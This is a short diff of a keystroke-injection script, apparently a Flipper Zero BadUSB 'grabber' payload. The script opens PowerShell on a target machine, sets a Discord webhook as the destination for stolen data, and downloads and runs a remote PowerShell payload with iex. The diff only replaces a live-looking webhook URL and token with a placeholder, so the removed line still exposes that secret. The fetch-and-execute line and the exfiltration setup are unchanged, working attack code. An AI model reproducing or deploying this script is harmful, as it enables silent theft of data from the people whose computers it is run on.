@@ -5,7 +5,7 @@ ALTSTRING powershell
 ENTER
 DELAY 1000
 REM edit your webhook here
-ALTSTRING $DiscordUrl = 'https://discord.com/api/webhooks/1194675026331447408/tVze9Ls7YQRQ5ZANKTIyvug9rfS1lG7wdXy9pZA_rUZ5KUDEms_E9SxgW8sZjMjkarl9'
+ALTSTRING $DiscordUrl = 'YOUR-WEBHOOK'
 ENTER
 ALTSTRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
 ENTER
